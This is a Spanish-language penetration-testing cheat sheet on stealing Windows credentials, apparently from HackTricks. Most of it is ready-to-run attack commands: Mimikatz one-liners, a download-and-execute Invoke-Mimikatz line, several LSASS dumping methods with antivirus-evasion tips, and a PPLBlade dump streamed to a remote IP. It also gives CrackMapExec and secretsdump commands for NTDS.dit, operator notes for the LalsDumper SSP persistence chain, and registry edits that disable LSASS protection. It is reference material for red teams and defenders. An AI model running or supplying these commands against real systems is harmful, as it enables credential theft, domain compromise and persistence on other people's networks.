# Robando Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Encuentra otras cosas que Mimikatz puede hacer en** [**this page**](credentials-mimikatz.md)**.

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Aprende sobre algunas posibles protecciones de credentials aquí.**](credentials-protections.md) **Estas protecciones podrían impedir que Mimikatz extraiga algunas credentials.**

## Credentials con Meterpreter

Usa el [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** he creado para **buscar passwords y hashes** dentro de la víctima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Evasión de AV

### Procdump + Mimikatz

Como **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**es una herramienta legítima de Microsoft**, no es detectado por Defender.\
Puedes usar esta herramienta para **dump the lsass process**, **download the dump** y **extract** las **credentials locally** desde el dump.

También puedes usar [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead of** the **name lsass.exe.**

### Volcado de lsass con **comsvcs.dll**

Una DLL llamada **comsvcs.dll** ubicada en `C:\Windows\System32` es responsable de **dumping process memory** en caso de un crash. Esta DLL incluye una **function** llamada **`MiniDumpW`**, diseñada para ser invocada usando `rundll32.exe`.\
No importa usar los dos primeros argumentos, pero el tercero se divide en tres componentes. El ID de proceso que se va a volcar constituye el primer componente, la ubicación del archivo dump representa el segundo, y el tercer componente es estrictamente la palabra **full**. No existen opciones alternativas.\
Al parsear estos tres componentes, la DLL procede a crear el archivo dump y a volcar la memoria del proceso especificado en dicho archivo.\
La utilización de **comsvcs.dll** es factible para volcar el proceso lsass, eliminando así la necesidad de subir y ejecutar procdump. Este método se describe en detalle en [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

El siguiente comando se emplea para la ejecución:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puedes automatizar este proceso con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Volcando lsass con el Administrador de tareas**

1. Haz clic derecho en la barra de tareas y selecciona Administrador de tareas
2. Haz clic en Más detalles
3. Busca el proceso "Local Security Authority Process" en la pestaña Procesos
4. Haz clic derecho sobre el proceso "Local Security Authority Process" y selecciona "Create dump file".

### Volcando lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que forma parte de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Volcado de lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una Protected Process Dumper Tool que permite ofuscar volcados de memoria y transferirlos a estaciones de trabajo remotas sin escribirlos en disco.

**Funcionalidades clave**:

1. Bypassing PPL protection
2. Ofuscar archivos de volcado de memoria para evadir los mecanismos de detección basados en firmas de Defender
3. Subir volcados de memoria con métodos RAW y SMB sin escribirlos en disco (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon distribuye un dumper de tres etapas llamado **LalsDumper** que nunca llama a `MiniDumpWriteDump`, por lo que los hooks de EDR en esa API nunca se disparan:

1. **Stage 1 loader (`lals.exe`)** – busca en `fdp.dll` un placeholder compuesto por 32 caracteres `d` minúsculas, lo sobrescribe con la ruta absoluta a `rtu.txt`, guarda el DLL parcheado como `nfdp.dll` y llama a `AddSecurityPackageA("nfdp","fdp")`. Esto fuerza a **LSASS** a cargar el DLL malicioso como un nuevo Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – cuando LSASS carga `nfdp.dll`, el DLL lee `rtu.txt`, XORa cada byte con `0x20` y mapea el blob decodificado en memoria antes de transferir la ejecución.
3. **Stage 3 dumper** – el payload mapeado re-implementa la lógica de MiniDump usando **direct syscalls** resueltas desde nombres de API hasheados (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Una exportación dedicada llamada `Tom` abre `%TEMP%\<pid>.ddt`, escribe un volcado comprimido de LSASS en el archivo y cierra el handle para que la exfiltración pueda hacerse más tarde.

Operator notes:

* Mantén `lals.exe`, `fdp.dll`, `nfdp.dll` y `rtu.txt` en el mismo directorio. Stage 1 reescribe el placeholder hard-coded con la ruta absoluta a `rtu.txt`, así que separarlos rompe la cadena.
* El registro ocurre añadiendo `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puedes establecer ese valor tú mismo para que LSASS recargue el SSP en cada arranque.
* Los archivos `%TEMP%\*.ddt` son volcados comprimidos. Descomprímelos localmente y luego pásalos a Mimikatz/Volatility para la extracción de credenciales.
* Ejecutar `lals.exe` requiere derechos admin/SeTcb para que `AddSecurityPackageA` tenga éxito; una vez que la llamada retorna, LSASS carga de forma transparente el SSP malicioso y ejecuta Stage 2.
* Eliminar el DLL del disco no lo expulsa de LSASS. O bien borra la entrada del registro y reinicia LSASS (reboot), o déjalo para persistencia a largo plazo.

## CrackMapExec

### Volcar hashes del SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Volcar secretos de LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Volcar el NTDS.dit del DC objetivo
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Volcar el historial de contraseñas de NTDS.dit desde el DC objetivo
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostrar el atributo pwdLastSet para cada cuenta de NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Estos archivos deberían estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de la manera habitual** porque están protegidos.

### From Registry

La forma más fácil de robar esos archivos es obtener una copia desde el registro:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Descarga** esos archivos en tu máquina Kali y **extrae los hashes** usando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Puedes realizar copias de archivos protegidos usando este servicio. Necesitas ser Administrator.

#### Using vssadmin

El binario vssadmin solo está disponible en versiones de Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Pero puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro usado es "C:" y se guarda en C:\users\Public) pero puedes usar esto para copiar cualquier archivo protegido:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Código del libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Finalmente, también podrías usar el [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

El archivo **NTDS.dit** es conocido como el corazón de **Active Directory**, guardando datos cruciales sobre objetos de usuario, grupos y sus pertenencias. Es donde se almacenan los **hashes de contraseña** de los usuarios del dominio. Este archivo es una base de datos **Extensible Storage Engine (ESE)** y reside en **_%SystemRoom%/NTDS/ntds.dit_**.

Dentro de esta base de datos se mantienen tres tablas principales:

- **Data Table**: Esta tabla se encarga de almacenar detalles sobre objetos como usuarios y grupos.
- **Link Table**: Rastrea relaciones, como la pertenencia a grupos.
- **SD Table**: Aquí se guardan los **security descriptors** para cada objeto, asegurando la seguridad y el control de acceso de los objetos almacenados.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows usa _Ntdsa.dll_ para interactuar con ese archivo y es utilizado por _lsass.exe_. Entonces, **parte** del archivo **NTDS.dit** puede estar ubicado **dentro de la memoria de `lsass`** (puedes encontrar los datos más recientemente accedidos probablemente debido a la mejora de rendimiento por el uso de una **cache**).

#### Descifrando los hashes dentro de NTDS.dit

El hash está cifrado 3 veces:

1. Descifrar la Clave de Encriptación de Contraseñas (**PEK**) usando el **BOOTKEY** y **RC4**.
2. Descifrar el **hash** usando **PEK** y **RC4**.
3. Descifrar el **hash** usando **DES**.

**PEK** tiene el **mismo valor** en **cada controlador de dominio**, pero está **cifrado** dentro del archivo **NTDS.dit** usando el **BOOTKEY** del **archivo SYSTEM del controlador de dominio (es diferente entre controladores de dominio)**. Por esto, para obtener las credenciales del archivo NTDS.dit **necesitas los archivos NTDS.dit y SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Disponible desde Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
También puedes usar el truco de [**volume shadow copy**](#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del archivo **SYSTEM** (de nuevo, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **Extrayendo hashes de NTDS.dit**

Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes usar herramientas como _secretsdump.py_ para **extraer los hashes**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
También puedes **extraerlos automáticamente** usando un usuario domain admin válido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Para **archivos NTDS.dit grandes** se recomienda extraerlos usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finalmente, también puedes usar el **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Extrayendo objetos de dominio de NTDS.dit a una base de datos SQLite**

Los objetos de NTDS pueden extraerse a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). No solo se extraen secretos, sino también los objetos completos y sus atributos para una extracción adicional de información cuando el archivo NTDS.dit bruto ya ha sido recuperado.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
La hive `SYSTEM` es opcional pero permite el descifrado de secretos (NT & LM hashes, credenciales suplementarias como contraseñas en texto claro, kerberos o trust keys, historiales de contraseñas NT & LM). Junto con otra información, se extraen los siguientes datos: cuentas de usuario y de equipo con sus hashes, UAC flags, marcas de tiempo del último inicio de sesión y del cambio de contraseña, descripción de las cuentas, nombres, UPN, SPN, grupos y membresías recursivas, árbol de unidades organizativas y su pertenencia, dominios de confianza con tipo de trust, dirección y atributos...

## Lazagne

Descarga el binario desde [here](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este binario para extraer credenciales de varios programas.
```
lazagne.exe all
```
## Otras herramientas para extraer credentials de SAM y LSASS

### Windows credentials Editor (WCE)

Esta herramienta puede usarse para extraer credentials de la memoria. Descárguela desde: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrae credentials del archivo SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraer credenciales del archivo SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Descárgalo desde:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) y simplemente **ejecútalo** y las contraseñas serán extraídas.

## Minado de sesiones RDP inactivas y debilitamiento de controles de seguridad

El RAT FinalDraft de Ink Dragon incluye un tasker `DumpRDPHistory` cuyas técnicas son útiles para cualquier red-teamer:

### Recopilación de telemetría al estilo DumpRDPHistory

* **Outbound RDP targets** – analiza cada hive de usuario en `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subclave almacena el nombre del servidor, `UsernameHint`, y la marca de tiempo de la última escritura. Puedes replicar la lógica de FinalDraft con PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – consulta el registro `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` para IDs de evento **21** (inicio de sesión exitoso) y **25** (desconexión) para mapear quién administró la máquina:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Una vez que sepas qué Domain Admin se conecta regularmente, volcar LSASS (con LalsDumper/Mimikatz) mientras su sesión **desconectada** aún exista. CredSSP + NTLM fallback deja su verificador y tokens en LSASS, que luego pueden reproducirse sobre SMB/WinRM para obtener `NTDS.dit` o preparar persistencia en controladores de dominio.

### Degradaciones del registro dirigidas por FinalDraft

El mismo implant también manipula varias claves del registro para facilitar el robo de credenciales:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Establecer `DisableRestrictedAdmin=1` fuerza el reuso completo de `credential/ticket` durante RDP, habilitando pivots estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` desactiva el filtrado de tokens de UAC, por lo que los administradores locales obtienen tokens sin restricciones a través de la red.
* `DSRMAdminLogonBehavior=2` permite que el administrador DSRM inicie sesión mientras el DC está en línea, dando a los atacantes otra cuenta integrada de alto privilegio.
* `RunAsPPL=0` elimina las protecciones PPL de LSASS, haciendo que el acceso a la memoria sea trivial para dumpers como LalsDumper.

## Referencias

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
